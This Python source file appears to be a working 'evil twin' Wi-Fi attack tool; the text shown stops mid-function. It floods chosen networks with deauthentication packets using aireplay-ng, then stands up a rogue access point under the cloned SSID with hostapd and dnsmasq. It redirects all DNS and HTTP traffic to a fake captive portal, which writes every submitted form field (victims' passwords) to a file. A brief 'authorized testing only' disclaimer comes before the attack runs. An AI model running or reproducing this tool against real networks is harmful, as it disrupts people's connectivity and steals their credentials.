#!/usr/bin/env python3

import os
import re
import sys
import time
import subprocess
import threading
import signal
import logging
from typing import List, Dict, Optional
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs

try:
    from core.wifi_iface import (
        get_interface_chipset as core_get_interface_chipset,
        get_interface_mode as core_get_interface_mode,
        list_network_interfaces as core_list_network_interfaces,
        restore_managed_mode as core_restore_managed_mode,
        set_interface_type as core_set_interface_type,
        wait_for_monitor_settle as core_wait_for_monitor_settle,
    )
except ModuleNotFoundError:
    MODULE_DIR = os.path.dirname(os.path.abspath(__file__))
    PROJECT_ROOT = os.path.dirname(MODULE_DIR)
    if PROJECT_ROOT not in sys.path:
        sys.path.insert(0, PROJECT_ROOT)
    from core.wifi_iface import (
        get_interface_chipset as core_get_interface_chipset,
        get_interface_mode as core_get_interface_mode,
        list_network_interfaces as core_list_network_interfaces,
        restore_managed_mode as core_restore_managed_mode,
        set_interface_type as core_set_interface_type,
        wait_for_monitor_settle as core_wait_for_monitor_settle,
    )

logging.basicConfig(level=logging.INFO, format="%(message)s")

COLOR_ENABLED = sys.stdout.isatty()
COLOR_RESET = "\033[0m" if COLOR_ENABLED else ""
COLOR_HEADER = "\033[36m" if COLOR_ENABLED else ""
COLOR_HIGHLIGHT = "\033[35m" if COLOR_ENABLED else ""
COLOR_RUNNING = "\033[31m" if COLOR_ENABLED else ""
COLOR_STOP = "\033[33m" if COLOR_ENABLED else ""
COLOR_SUCCESS = "\033[32m" if COLOR_ENABLED else ""
STYLE_BOLD = "\033[1m" if COLOR_ENABLED else ""


def color_text(text: str, color: str) -> str:
    return f"{color}{text}{COLOR_RESET}" if color else text


def style(text: str, *styles: str) -> str:
    prefix = "".join(s for s in styles if s)
    return f"{prefix}{text}{COLOR_RESET}" if prefix else text


MODULE_DIR = os.path.dirname(__file__)
PROJECT_ROOT = os.path.dirname(MODULE_DIR)
LOG_DIR = os.path.join(PROJECT_ROOT, "log")
HTML_DIR = os.path.join(PROJECT_ROOT, "html")
AP_CHANNEL = "6"
AP_IP = "192.168.100.1"
SUBNET = "192.168.100.0"
NETMASK = "255.255.255.0"
DHCP_RANGE_START = "192.168.100.100"
DHCP_RANGE_END = "192.168.100.200"
LEASE_TIME = "12h"

PORTAL_HTML = None
PORTAL_HTML_PATH = os.path.join(HTML_DIR, "portal.html")
CAPTURE_FILE_PATH = None
SUBMISSION_EVENT = threading.Event()
SUBMISSION_LOCK = threading.Lock()
LAST_SUBMISSION_IP = None

ATTACK_PROCESS: Optional[subprocess.Popen] = None
DEAUTH_THREAD: Optional[threading.Thread] = None
DEAUTH_STOP_EVENT = threading.Event()
ATTACK_INTERFACE: Optional[str] = None
AP_INTERFACE: Optional[str] = None
AP_SSID: Optional[str] = None
HTTP_SERVER: Optional[HTTPServer] = None
HOSTAPD_PROC: Optional[subprocess.Popen] = None
DNSMASQ_PROC: Optional[subprocess.Popen] = None
DEAUTH_ACTIVE = True
DEAUTH_FAILURES = 0
SILENT_INITIAL_DEAUTH_FAILURES = 1
DEAUTH_BURST_SECONDS = 2.5
DEAUTH_SWITCH_DELAY_SECONDS = 0.25
MONITOR_SETTLE_SECONDS = 2.0
SCAN_BUSY_RETRY_DELAY = 0.8
SCAN_COMMAND_TIMEOUT = 4.0
IWLIST_SCAN_TIMEOUT = 12.0
NMCLI_SCAN_TIMEOUT = 6.0


def load_portal_html() -> str:
    if not os.path.isfile(PORTAL_HTML_PATH):
        raise FileNotFoundError(f"Portal HTML file not found: {PORTAL_HTML_PATH}")
    with open(PORTAL_HTML_PATH, "r", encoding="utf-8") as portal_file:
        return portal_file.read()


def list_portal_html_files() -> List[str]:
    if not os.path.isdir(HTML_DIR):
        return []
    files = [
        name
        for name in os.listdir(HTML_DIR)
        if os.path.isfile(os.path.join(HTML_DIR, name)) and name.lower().endswith(".html")
    ]
    files.sort(key=lambda name: (name.lower() != "portal.html", name.lower()))
    return files


def select_portal_html_file() -> str:
    html_files = list_portal_html_files()
    if not html_files:
        logging.error("No .html files found in: %s", HTML_DIR)
        sys.exit(1)

    logging.info("")
    logging.info(style("Available portal HTML files:", STYLE_BOLD))
    for index, filename in enumerate(html_files, start=1):
        label = f"{index})"
        logging.info("  %s %s", color_text(label, COLOR_HIGHLIGHT), filename)

    while True:
        choice = input(f"{style('Select portal HTML', STYLE_BOLD)} (number): ").strip()
        if choice.isdigit():
            idx = int(choice)
            if 1 <= idx <= len(html_files):
                return os.path.join(HTML_DIR, html_files[idx - 1])
        logging.warning("Invalid selection. Try again.")


def get_interface_chipset(interface: str) -> str:
    return core_get_interface_chipset(interface)


def list_network_interfaces() -> List[str]:
    return core_list_network_interfaces()


def get_interface_mode(interface: str) -> Optional[str]:
    return core_get_interface_mode(interface, fallback_iwconfig=False)


def is_monitor_mode(interface: str) -> bool:
    return get_interface_mode(interface) == "monitor"


def wait_for_monitor_settle(interface: str) -> None:
    _ = interface
    core_wait_for_monitor_settle(MONITOR_SETTLE_SECONDS)


def set_interface_type(interface: str, mode: str) -> bool:
    ok, error = core_set_interface_type(interface, mode, settle_seconds=0.5)
    if ok:
        return True
    logging.error("Failed to set %s mode: %s", mode, error or "unknown error")
    return False


def freq_to_channel(freq: float) -> Optional[int]:
    if 2412 <= freq <= 2472:
        return int((freq - 2407) // 5)
    if freq == 2484:
        return 14
    if 5000 <= freq <= 5825:
        return int((freq - 5000) // 5)
    return None


def parse_channel_value(text: str) -> Optional[int]:
    try:
        return int(text)
    except (TypeError, ValueError):
        return None


def parse_freq_value(text: str) -> Optional[float]:
    try:
        value = float(text)
    except (TypeError, ValueError):
        return None
    if value > 100000:
        value /= 1000.0
    return value


def is_scan_busy_error(stderr: str) -> bool:
    if not stderr:
        return False
    lower = stderr.lower()
    return "resource busy" in lower or "device or resource busy" in lower or "(-16)" in lower


def is_scan_unsupported_error(stderr: str) -> bool:
    if not stderr:
        return False
    lower = stderr.lower()
    return "operation not supported" in lower or "not supported" in lower or "(-95)" in lower


def scan_wireless_networks_iwlist(interface: str, timeout_seconds: float) -> List[Dict[str, Optional[str]]]:
    try:
        result = subprocess.run(
            ["iwlist", interface, "scanning"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            timeout=timeout_seconds,
            check=False,
        )
    except (FileNotFoundError, subprocess.TimeoutExpired):
        return []

    if result.returncode != 0:
        return []

    networks: Dict[str, Dict[str, Optional[str]]] = {}
    current: Dict[str, Optional[str]] = {}

    def finalize_current() -> None:
        if current.get("bssid") and current.get("ssid"):
            existing = networks.get(current["bssid"])
            if existing is None or (
                current.get("signal") is not None
                and (existing.get("signal") is None or current["signal"] > existing["signal"])
            ):
                networks[current["bssid"]] = dict(current)

    for raw_line in result.stdout.splitlines():
        line = raw_line.strip()
        if "Cell " in line and "Address:" in line:
            finalize_current()
            bssid = line.split("Address:", 1)[1].strip()
            current = {"bssid": bssid, "ssid": None, "signal": None, "channel": None}
            continue
        if line.startswith("ESSID:"):
            ssid_val = line.split(":", 1)[1].strip().strip('"')
            current["ssid"] = ssid_val if ssid_val else "<hidden>"
            continue
        if "Signal level=" in line:
            signal_text = line.split("Signal level=", 1)[1]
            cleaned = (
                signal_text.replace("dBm", " ")
                .replace("dbm", " ")
                .replace("/", " ")
                .replace(";", " ")
            )
            for part in cleaned.split():
                try:
                    current["signal"] = float(part)
                    break
                except ValueError:
                    continue
            continue
        if "Channel:" in line:
            channel_text = line.split("Channel:", 1)[1].strip()
            channel_val = parse_channel_value(channel_text.split()[0])
            if channel_val is not None:
                current["channel"] = channel_val
            continue
        if "Frequency:" in line and "(Channel" in line:
            try:
                channel_part = line.split("(Channel", 1)[1].split(")", 1)[0].strip()
            except IndexError:
                channel_part = ""
            channel_val = parse_channel_value(channel_part.split()[0] if channel_part else None)
            if channel_val is not None:
                current["channel"] = channel_val

    finalize_current()
    return sorted(
        networks.values(),
        key=lambda item: item["signal"] if item["signal"] is not None else -1000,
        reverse=True,
    )


def scan_wireless_networks_nmcli(interface: str, timeout_seconds: float) -> List[Dict[str, Optional[str]]]:
    try:
        subprocess.run(
            ["nmcli", "dev", "wifi", "rescan", "ifname", interface],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            timeout=timeout_seconds,
            check=False,
        )
        result = subprocess.run(
            ["nmcli", "-t", "-f", "SSID,BSSID,FREQ,SIGNAL", "dev", "wifi", "list", "ifname", interface],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            timeout=timeout_seconds,
            check=False,
        )
    except (FileNotFoundError, subprocess.TimeoutExpired):
        return []

    if result.returncode != 0:
        return []

    networks: Dict[str, Dict[str, Optional[str]]] = {}
    for raw_line in result.stdout.splitlines():
        line = raw_line.strip()
        if not line:
            continue
        match = re.match(
            r"^(?P<ssid>.*?):(?P<bssid>(?:[0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}):(?P<freq>[^:]*):(?P<signal>[^:]*)$",
            line,
        )
        if not match:
            continue
        ssid = match.group("ssid").replace("\\:", ":").replace("\\\\", "\\").strip()
        bssid = match.group("bssid").strip().lower()
        freq_val = parse_freq_value(match.group("freq").strip())
        signal_pct = match.group("signal").strip()
        try:
            pct = float(signal_pct)
        except ValueError:
            pct = None
        signal_dbm: Optional[float]
        if pct is None:
            signal_dbm = None
        else:
            signal_dbm = (pct / 2.0) - 100.0
        channel = freq_to_channel(freq_val) if freq_val is not None else None
        ssid_val = ssid if ssid else "<hidden>"
        if not bssid:
            continue
        existing = networks.get(bssid)
        entry = {"bssid": bssid, "ssid": ssid_val, "signal": signal_dbm, "channel": channel}
        if existing is None or (
            signal_dbm is not None
            and (existing.get("signal") is None or signal_dbm > existing["signal"])
        ):
            networks[bssid] = entry

    return sorted(
        networks.values(),
        key=lambda item: item["signal"] if item["signal"] is not None else -1000,
        reverse=True,
    )


def scan_wireless_networks(
    interface: str,
    duration_seconds: int = 15,
    show_progress: bool = False,
) -> List[Dict[str, Optional[str]]]:
    def run_scan(timeout_seconds: float) -> subprocess.CompletedProcess:
        return subprocess.run(
            ["iw", "dev", interface, "scan"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            timeout=timeout_seconds,
            check=False,
        )

    started_in_monitor = is_monitor_mode(interface)
    restore_monitor_after_scan = False
    fallback_reason: Optional[str] = None

    def restore_monitor_mode() -> None:
        if not restore_monitor_after_scan:
            return
        if not set_interface_type(interface, "monitor"):
            logging.error("Failed to restore monitor mode after scan.")
            return
        wait_for_monitor_settle(interface)

    if started_in_monitor:
        if set_interface_type(interface, "managed"):
            restore_monitor_after_scan = True
            time.sleep(1.0)
        else:
            logging.warning("Could not switch %s to managed mode for scan.", interface)

    end_time = time.time() + max(1, duration_seconds)
    networks: Dict[str, Dict[str, Optional[str]]] = {}
    last_remaining = None
    while time.time() < end_time:
        if show_progress and COLOR_ENABLED:
            remaining = max(0, int(end_time - time.time()))
            if remaining != last_remaining:
                last_remaining = remaining
                message = (
                    f"{style('Scanning', STYLE_BOLD)}... "
                    f"{style(str(remaining), COLOR_SUCCESS, STYLE_BOLD)}s remaining"
                )
                sys.stdout.write("\r" + message)
                sys.stdout.flush()
        try:
            remaining_time = end_time - time.time()
            if remaining_time <= 0:
                break
            timeout_seconds = max(1.0, min(SCAN_COMMAND_TIMEOUT, remaining_time))
            result = run_scan(timeout_seconds)
        except FileNotFoundError:
            logging.error("Required tool 'iw' not found!")
            if show_progress and COLOR_ENABLED:
                sys.stdout.write("\n")
            restore_monitor_mode()
            return []
        except subprocess.TimeoutExpired:
            time.sleep(0.2)
            continue

        if result.returncode != 0:
            err_text = result.stderr.strip()
            if is_scan_busy_error(err_text):
                time.sleep(SCAN_BUSY_RETRY_DELAY)
                continue
            fallback_reason = err_text or "unknown error"
            if is_scan_unsupported_error(err_text):
                logging.warning(
                    "iw scan is not supported on %s in current state (%s). Trying fallback scanners.",
                    interface,
                    fallback_reason,
                )
            else:
                logging.warning(
                    "iw scan failed on %s (%s). Trying fallback scanners.",
                    interface,
                    fallback_reason,
                )
            break

        current: Dict[str, Optional[str]] = {}
        for raw_line in result.stdout.splitlines():
            line = raw_line.strip()
            if line.startswith("BSS "):
                if current.get("bssid") and current.get("ssid"):
                    existing = networks.get(current["bssid"])
                    if existing is None or (
                        current.get("signal") is not None
                        and (existing.get("signal") is None or current["signal"] > existing["signal"])
                    ):
                        networks[current["bssid"]] = current
                current = {"bssid": line.split()[1].split("(")[0], "ssid": None, "signal": None, "channel": None}
                continue
            if line.startswith("freq:"):
                parts = line.split()
                freq_val = parse_freq_value(parts[1]) if len(parts) > 1 else None
                current["channel"] = freq_to_channel(freq_val) if freq_val is not None else None
                continue
            if line.startswith("DS Parameter set:"):
                parts = line.split()
                if len(parts) >= 4 and parts[-2] == "channel":
                    channel_val = parse_channel_value(parts[-1])
                    if channel_val is not None:
                        current["channel"] = channel_val
                continue
            if line.startswith("* primary channel:"):
                parts = line.split(":")
                if len(parts) == 2:
                    channel_val = parse_channel_value(parts[1].strip())
                    if channel_val is not None:
                        current["channel"] = channel_val
                continue
            if line.startswith("signal:"):
                parts = line.split()
                try:
                    current["signal"] = float(parts[1])
                except (IndexError, ValueError):
                    current["signal"] = None
                continue
            if line.startswith("SSID:"):
                ssid_val = line.split(":", 1)[1].strip()
                current["ssid"] = ssid_val if ssid_val else "<hidden>"

        if current.get("bssid") and current.get("ssid"):
            existing = networks.get(current["bssid"])
            if existing is None or (
                current.get("signal") is not None
                and (existing.get("signal") is None or current["signal"] > existing["signal"])
            ):
                networks[current["bssid"]] = current

        time.sleep(0.2)

    if show_progress and COLOR_ENABLED:
        sys.stdout.write("\n")

    sorted_networks = sorted(
        networks.values(),
        key=lambda item: item["signal"] if item["signal"] is not None else -1000,
        reverse=True,
    )
    if sorted_networks:
        restore_monitor_mode()
        return sorted_networks

    fallback = scan_wireless_networks_iwlist(interface, IWLIST_SCAN_TIMEOUT)
    if fallback:
        restore_monitor_mode()
        return fallback
    nmcli_fallback = scan_wireless_networks_nmcli(interface, NMCLI_SCAN_TIMEOUT)
    if nmcli_fallback:
        restore_monitor_mode()
        return nmcli_fallback

    restore_monitor_mode()
    if fallback_reason:
        logging.error("Wireless scan failed: %s", fallback_reason)
    return []


def parse_network_selection(choice: str, max_index: int) -> Optional[List[int]]:
    if not choice:
        return None
    selected: List[int] = []
    for part in choice.split(","):
        token = part.strip()
        if not token or not token.isdigit():
            return None
        idx = int(token)
        if idx < 1 or idx > max_index:
            return None
        if idx not in selected:
            selected.append(idx)
    return selected if selected else None


def select_networks(attack_interface: str, duration_seconds: int) -> Optional[List[Dict[str, Optional[str]]]]:
    while True:
        networks = scan_wireless_networks(attack_interface, duration_seconds, show_progress=True)
        if not networks:
            logging.warning("No networks found during scan.")
            retry = input(
                f"{style('Rescan', STYLE_BOLD)} (Y) or {style('Exit', STYLE_BOLD)} (E): "
            ).strip().lower()
            if retry == "y":
                continue
            return None

        logging.info("")
        logging.info(style("Available networks:", STYLE_BOLD))
        for index, net in enumerate(networks, start=1):
            signal = f"{net['signal']:.1f} dBm" if net["signal"] is not None else "signal unknown"
            channel = f"ch {net['channel']}" if net["channel"] else "ch ?"
            label = f"{index}) {net['ssid']} ({net['bssid']}) -"
            logging.info("  %s %s %s", color_text(label, COLOR_HIGHLIGHT), channel, signal)

        choice = input(
            f"{style('Select network(s)', STYLE_BOLD)} (number, e.g. 1 or 1,3; R to rescan; E to exit): "
        ).strip().lower()
        if choice == "r":
            continue
        if choice in {"e", "q", "exit", "quit"}:
            return None
        selected_indexes = parse_network_selection(choice, len(networks))
        if selected_indexes:
            return [networks[idx - 1] for idx in selected_indexes]
        logging.warning("Invalid selection. Try again.")


def choose_ap_ssid(target_networks: List[Dict[str, Optional[str]]]) -> str:
    options: List[str] = []
    for target in target_networks:
        ssid = target.get("ssid") or "<hidden>"
        if ssid not in options:
            options.append(ssid)

    if not options:
        return "<hidden>"
    if len(options) == 1:
        return options[0]

    logging.info("")
    logging.info(style("Choose AP SSID:", STYLE_BOLD))
    for index, ssid in enumerate(options, start=1):
        label = f"{index})"
        logging.info("  %s %s", color_text(label, COLOR_HIGHLIGHT), ssid)

    while True:
        choice = input(f"{style('Select AP name', STYLE_BOLD)} (number): ").strip()
        if choice.isdigit():
            idx = int(choice)
            if 1 <= idx <= len(options):
                return options[idx - 1]
        logging.warning("Invalid selection. Try again.")


def select_interface(interfaces: List[str], prompt_label: str) -> str:
    if not interfaces:
        logging.error("No network interfaces found.")
        sys.exit(1)

    logging.info("")
    logging.info(style("Available interfaces:", STYLE_BOLD))
    for index, name in enumerate(interfaces, start=1):
        chipset = get_interface_chipset(name)
        display_name = f"{name} (AP running)" if name == "wlan0" else name
        label = f"{index}) {display_name} -"
        logging.info("  %s %s", color_text(label, COLOR_HIGHLIGHT), chipset)

    while True:
        choice = input(f"{style(prompt_label, STYLE_BOLD)} (number or name): ").strip()
        if not choice:
            logging.warning("Please select an interface.")
            continue
        if choice.isdigit():
            idx = int(choice)
            if 1 <= idx <= len(interfaces):
                return interfaces[idx - 1]
        if choice in interfaces:
            return choice
        logging.warning("Invalid selection. Try again.")


def enable_monitor_mode(interface: str, channel: Optional[int]) -> bool:
    try:
        if not set_interface_type(interface, "monitor"):
            return False
        if channel:
            subprocess.run(["iw", "dev", interface, "set", "channel", str(channel)], stderr=subprocess.DEVNULL)
        wait_for_monitor_settle(interface)
        if not is_monitor_mode(interface):
            current_mode = get_interface_mode(interface)
            logging.error(
                "Monitor mode not active on %s (current mode: %s).",
                interface,
                current_mode or "unknown",
            )
            return False
        logging.info("Monitor mode confirmed on %s.", interface)
        return True
    except Exception as exc:
        logging.error("Failed to enable monitor mode: %s", exc)
        return False


def restore_managed_mode(interface: str) -> None:
    core_restore_managed_mode(interface)


def format_target(target: Dict[str, Optional[str]]) -> str:
    ssid = target.get("ssid") or "<hidden>"
    bssid = target.get("bssid") or "unknown"
    channel = target.get("channel")
    channel_label = f"ch {channel}" if channel else "ch ?"
    return f"{ssid} ({bssid}, {channel_label})"


def stop_process(process: subprocess.Popen) -> None:
    if process.poll() is not None:
        return
    try:
        try:
            pgid = os.getpgid(process.pid)
        except Exception:
            pgid = None
        if pgid is not None:
            try:
                os.killpg(pgid, signal.SIGTERM)
            except Exception:
                process.terminate()
        else:
            process.terminate()
        process.wait(timeout=3)
    except subprocess.TimeoutExpired:
        try:
            if pgid is not None:
                os.killpg(pgid, signal.SIGKILL)
            else:
                process.kill()
        except Exception:
            try:
                process.kill()
            except Exception:
                pass
    except Exception:
        pass


def deauth_worker(interface: str, targets: List[Dict[str, Optional[str]]]) -> None:
    global ATTACK_PROCESS, DEAUTH_FAILURES
    while not DEAUTH_STOP_EVENT.is_set() and DEAUTH_ACTIVE:
        for target in targets:
            if DEAUTH_STOP_EVENT.is_set() or not DEAUTH_ACTIVE:
                break

            bssid = target.get("bssid")
            channel = target.get("channel")
            if not bssid:
                continue

            if channel:
                subprocess.run(
                    ["iw", "dev", interface, "set", "channel", str(channel)],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    check=False,
                )

            try:
                process = subprocess.Popen(
                    ["aireplay-ng", "-0", "0", "-a", bssid, interface],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.PIPE,
                    text=True,
                    preexec_fn=os.setsid,
                )
            except FileNotFoundError:
                logging.error("Required tool 'aireplay-ng' not found!")
                return
            except Exception as exc:
                DEAUTH_FAILURES += 1
                if DEAUTH_FAILURES > SILENT_INITIAL_DEAUTH_FAILURES:
                    logging.warning("Failed to start deauth on %s: %s", bssid, exc)
                time.sleep(1)
                continue

            ATTACK_PROCESS = process
            burst_end = time.time() + DEAUTH_BURST_SECONDS
            early_error = ""

            while time.time() < burst_end:
                if DEAUTH_STOP_EVENT.is_set() or not DEAUTH_ACTIVE:
                    break
                if process.poll() is not None:
                    if process.stderr:
                        try:
                            early_error = process.stderr.read().strip()
                        except Exception:
                            early_error = ""
                    break
                time.sleep(0.15)

            if process.poll() is None:
                stop_process(process)
            else:
                DEAUTH_FAILURES += 1
                if DEAUTH_FAILURES > SILENT_INITIAL_DEAUTH_FAILURES:
                    if early_error:
                        logging.warning("Deauth exited on %s: %s", bssid, early_error)
                    else:
                        logging.warning("Deauth exited on %s.", bssid)

            ATTACK_PROCESS = None

            if len(targets) > 1:
                time.sleep(DEAUTH_SWITCH_DELAY_SECONDS)


def start_deauth_attack(interface: str, targets: List[Dict[str, Optional[str]]]) -> bool:
    global DEAUTH_THREAD

    valid_targets = [target for target in targets if target.get("bssid")]
    if not valid_targets:
        logging.error("No valid BSSID targets; cannot start attack.")
        return False

    stop_attack()
    DEAUTH_STOP_EVENT.clear()
    DEAUTH_THREAD = threading.Thread(target=deauth_worker, args=(interface, valid_targets), daemon=True)
    DEAUTH_THREAD.start()

    time.sleep(0.6)
    if not DEAUTH_THREAD.is_alive():
        logging.error("Failed to start deauth worker.")
        DEAUTH_THREAD = None
        return False

    return True


def stop_attack() -> None:
    global ATTACK_PROCESS, DEAUTH_THREAD
    DEAUTH_STOP_EVENT.set()

    if ATTACK_PROCESS:
        stop_process(ATTACK_PROCESS)
    ATTACK_PROCESS = None

    if DEAUTH_THREAD and DEAUTH_THREAD.is_alive():
        try:
            DEAUTH_THREAD.join(timeout=3)
        except Exception:
            pass
    DEAUTH_THREAD = None


def shutdown_http_server():
    global HTTP_SERVER
    if not HTTP_SERVER:
        return
    try:
        shutdown_thread = threading.Thread(target=HTTP_SERVER.shutdown)
        shutdown_thread.daemon = True
        shutdown_thread.start()
        shutdown_thread.join(timeout=2)
    except Exception:
        pass
    try:
        HTTP_SERVER.server_close()
    except Exception:
        pass
    HTTP_SERVER = None


def sanitize_filename(name: str) -> str:
    sanitized = (name or "").strip()
    if not sanitized:
        sanitized = "evil_twin_capture"
    sanitized = sanitized.replace(os.sep, "_")
    if os.altsep:
        sanitized = sanitized.replace(os.altsep, "_")
    if not sanitized.lower().endswith(".txt"):
        sanitized = f"{sanitized}.txt"
    return sanitized


class CaptivePortalHandler(BaseHTTPRequestHandler):
    PORTAL_PATHS = {
        "/",
        "/index.html",
        "/captive.html",
        "/hotspot-detect.html",
        "/generate_204",
        "/gen_204",
        "/mobile/status.php",
        "/ncsi.txt",
        "/connecttest.txt",
        "/redirect",
        "/success.txt",
        "/library/test/success.html",
    }

    def _redirect_to_portal(self):
        self.send_response(302)
        self.send_header("Location", f"http://{AP_IP}/")
        self.send_header("Cache-Control", "no-store, no-cache, must-revalidate, max-age=0")
        self.send_header("Pragma", "no-cache")
        self.end_headers()

    def do_GET(self):
        logging.info("Portal connection from %s to %s", self.client_address[0], self.path)

        if self.path in self.PORTAL_PATHS:
            if self.path in {"/generate_204", "/gen_204", "/redirect", "/connecttest.txt", "/ncsi.txt"}:
                self._redirect_to_portal()
                return

        html_content = PORTAL_HTML or load_portal_html()

        self.send_response(200)
        self.send_header("Content-type", "text/html; charset=utf-8")
        self.send_header("Cache-Control", "no-store, no-cache, must-revalidate, max-age=0")
        self.send_header("Pragma", "no-cache")
        self.send_header("Content-Length", len(html_content.encode("utf-8")))
        self.end_headers()
        self.wfile.write(html_content.encode("utf-8"))

    def do_POST(self):
        content_length = int(self.headers.get("Content-Length", 0))
        post_data = self.rfile.read(content_length)
        decoded = post_data.decode("utf-8", errors="replace")
        parsed = parse_qs(decoded)
        global LAST_SUBMISSION_IP
        with SUBMISSION_LOCK:
            LAST_SUBMISSION_IP = self.client_address[0]
        SUBMISSION_EVENT.set()

        if CAPTURE_FILE_PATH:
            timestamp = datetime.now().isoformat(sep=" ", timespec="seconds")
            with open(CAPTURE_FILE_PATH, "a", encoding="utf-8") as capture_file:
                capture_file.write(f"[{timestamp}] {self.client_address[0]}\n")
                if parsed:
                    for key, values in parsed.items():
                        for value in values:
                            capture_file.write(f"{key}={value}\n")
                else:
                    capture_file.write(decoded + "\n")
                capture_file.write("\n")

        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(b"Login received.")

    def log_message(self, format, *args):
        pass


def setup_ap() -> bool:
    global HOSTAPD_PROC, DNSMASQ_PROC
    logging.info("Setting up Access Point...")

    try:
        time.sleep(2)

        subprocess.run(["ip", "link", "set", AP_INTERFACE, "down"])
        time.sleep(1)
        subprocess.run(["ip", "link", "set", AP_INTERFACE, "up"])
        time.sleep(1)

        subprocess.run(["ip", "addr", "flush", "dev", AP_INTERFACE])
        subprocess.run(["ip", "addr", "add", f"{AP_IP}/24", "dev", AP_INTERFACE])

        hostapd_conf = f"""
interface={AP_INTERFACE}
driver=nl80211
ssid={AP_SSID}
hw_mode=g
channel={AP_CHANNEL}
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
"""

        with open("/tmp/hostapd.conf", "w") as f:
            f.write(hostapd_conf)

        HOSTAPD_PROC = subprocess.Popen(
            ["hostapd", "/tmp/hostapd.conf"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )
        time.sleep(3)

        dnsmasq_conf = f"""
interface={AP_INTERFACE}
dhcp-range={DHCP_RANGE_START},{DHCP_RANGE_END},{NETMASK},{LEASE_TIME}
dhcp-option=3,{AP_IP}
dhcp-option=6,{AP_IP}
address=/#/{AP_IP}
server=8.8.8.8
log-queries
log-dhcp
"""

        with open("/tmp/dnsmasq.conf", "w") as f:
            f.write(dnsmasq_conf)

        DNSMASQ_PROC = subprocess.Popen(
            ["dnsmasq", "-C", "/tmp/dnsmasq.conf", "--no-daemon"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )
        time.sleep(2)

        subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        subprocess.run(["iptables", "-t", "nat", "-F"])
        subprocess.run(["iptables", "-F"])
        subprocess.run(
            [
                "iptables",
                "-t",
                "nat",
                "-A",
                "PREROUTING",
                "-i",
                AP_INTERFACE,
                "-p",
                "tcp",
                "--dport",
                "80",
                "-j",
                "DNAT",
                "--to-destination",
                f"{AP_IP}:80",
            ]
        )

        logging.info(f"Access Point '{AP_SSID}' started on {AP_IP}")
        logging.info(f"DHCP range: {DHCP_RANGE_START} - {DHCP_RANGE_END}")

        return True
    except Exception as exc:
        logging.error(f"Error setting up AP: {exc}")
        return False


def start_captive_portal() -> HTTPServer:
    logging.info(f"Starting Captive Portal HTTP server on {AP_IP}:80")

    server = HTTPServer((AP_IP, 80), CaptivePortalHandler)
    server_thread = threading.Thread(target=server.serve_forever)
    server_thread.daemon = True
    server_thread.start()

    logging.info("Captive Portal HTTP server started")
    return server


def cleanup():
    logging.info("Cleaning up...")
    try:
        stop_attack()
    except Exception:
        pass

    try:
        shutdown_http_server()
    except Exception:
        pass

    if HOSTAPD_PROC and HOSTAPD_PROC.poll() is None:
        try:
            HOSTAPD_PROC.terminate()
            HOSTAPD_PROC.wait(timeout=3)
        except Exception:
            try:
                HOSTAPD_PROC.kill()
            except Exception:
                pass

    if DNSMASQ_PROC and DNSMASQ_PROC.poll() is None:
        try:
            DNSMASQ_PROC.terminate()
            DNSMASQ_PROC.wait(timeout=3)
        except Exception:
            try:
                DNSMASQ_PROC.kill()
            except Exception:
                pass

    if AP_INTERFACE:
        try:
            subprocess.run(
                [
                    "iptables",
                    "-t",
                    "nat",
                    "-D",
                    "PREROUTING",
                    "-i",
                    AP_INTERFACE,
                    "-p",
                    "tcp",
                    "--dport",
                    "80",
                    "-j",
                    "DNAT",
                    "--to-destination",
                    f"{AP_IP}:80",
                ],
                stderr=subprocess.DEVNULL,
            )
        except Exception:
            pass

    if AP_INTERFACE:
        try:
            subprocess.run(["ip", "link", "set", AP_INTERFACE, "down"], stderr=subprocess.DEVNULL)
        except Exception:
            pass

    if ATTACK_INTERFACE:
        try:
            restore_managed_mode(ATTACK_INTERFACE)
        except Exception:
            pass

    logging.info("Cleanup completed")


def disclaimer_confirmed(ap_ssid: str, targets: List[Dict[str, Optional[str]]]) -> bool:
    logging.info(style("Disclaimer:", STYLE_BOLD))
    logging.info(
        "This tool is intended for authorized testing only. "
        "You must own the equipment and have explicit permission."
    )
    logging.info("AP SSID: %s", style(ap_ssid, COLOR_SUCCESS, STYLE_BOLD))
    logging.info("Targets:")
    for target in targets:
        logging.info("  - %s", format_target(target))
    choice = input(f"{style('Proceed', STYLE_BOLD)}? (Y/N): ").strip().lower()
    return choice == "y"


def run_twins_session() -> bool:
    global ATTACK_INTERFACE, AP_INTERFACE, AP_SSID, CAPTURE_FILE_PATH, HTTP_SERVER
    global PORTAL_HTML_PATH, PORTAL_HTML
    global HOSTAPD_PROC, DNSMASQ_PROC, DEAUTH_ACTIVE, DEAUTH_FAILURES

    SUBMISSION_EVENT.clear()
    with SUBMISSION_LOCK:
        global LAST_SUBMISSION_IP
        LAST_SUBMISSION_IP = None
    DEAUTH_ACTIVE = True
    DEAUTH_FAILURES = 0

    restart_requested = False
    interfaces = list_network_interfaces()
    ATTACK_INTERFACE = select_interface(interfaces, "Select attack interface")

    logging.info("")
    input(f"{style('Press Enter', COLOR_SUCCESS, STYLE_BOLD)} to switch {ATTACK_INTERFACE} to monitor mode...")
    if not enable_monitor_mode(ATTACK_INTERFACE, None):
        return False

    logging.info("")
    scan_prompt = (
        f"{style('Scan duration', STYLE_BOLD)} in seconds "
        f"({style('Enter', COLOR_SUCCESS, STYLE_BOLD)} for {style('15', COLOR_SUCCESS, STYLE_BOLD)}): "
    )
    scan_input = input(scan_prompt).strip()
    try:
        scan_seconds = int(scan_input) if scan_input else 15
    except ValueError:
        logging.warning("Invalid duration. Using 15 seconds.")
        scan_seconds = 15
    if scan_seconds < 1:
